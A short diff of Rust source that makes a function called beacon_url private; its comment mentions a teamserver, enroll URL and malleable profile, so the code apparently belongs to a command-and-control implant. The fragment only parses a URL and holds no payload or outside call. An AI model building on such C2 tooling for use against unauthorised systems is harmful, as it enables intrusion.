@@ -74,7 +74,7 @@ pub trait Contact {
 /// The beacon URL off an enroll URL: scheme and authority plus the fixed
 /// envelope route, any path dropped (the teamserver maps the route; the
 /// malleable profile shapes only the enroll request).
-pub fn beacon_url(enroll_url: &str) -> String {
+fn beacon_url(enroll_url: &str) -> String {
     match enroll_url.find("://") {
         Some(at) => {
             let after = &enroll_url[at + 3..];
